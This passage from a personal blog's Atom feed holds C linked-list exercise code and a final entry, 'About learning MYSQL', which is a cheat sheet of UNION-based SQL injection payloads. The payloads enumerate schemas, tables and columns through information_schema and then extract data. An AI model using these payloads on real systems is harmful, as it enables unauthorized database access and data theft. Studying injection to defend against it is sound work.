	&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//删除指定节点（头节点为0号）
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//返回链表的节点数
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//删除链表
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//修改指定节点的数据（头节点为0号），反回修改的节点的指针
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node_modify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</content>
<category term="c" />
<summary>  some Pointer and Struct practicing</summary>
</entry>
<entry>
<title>About learning MYSQL</title>
<link href="http://localhost:4000/2017/09/24/mysql.html" rel="alternate" type="text/html" title="About learning MYSQL" />
<published>2017-09-24T00:00:00+08:00</published>
<updated>2017-09-24T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/09/24/mysql</id>
<content type="html" xml:base="http://localhost:4000/2017/09/24/mysql.html">&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
id=? order by n
union select null,null,~,n

#find_schema:
union select 1,2,~,group_concat(schema_name),~,n from information_schema.schemata
#find_tables:
union select 1,2,~,group_concat(table_name),~,n from information_schema.tables where table_schema=&quot;~~&quot;
#find_columns:
union select 1,2,~,group_concat(column_name),~,n from information_schema.columns where table_schema=&quot;~~&quot; and table_name=&quot;~~&quot;

#get data
union select 1,2,~,group_concat(column),~,n from schema.table

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</content>
<category term="others" />
<summary>```</summary>
</entry>
</feed>
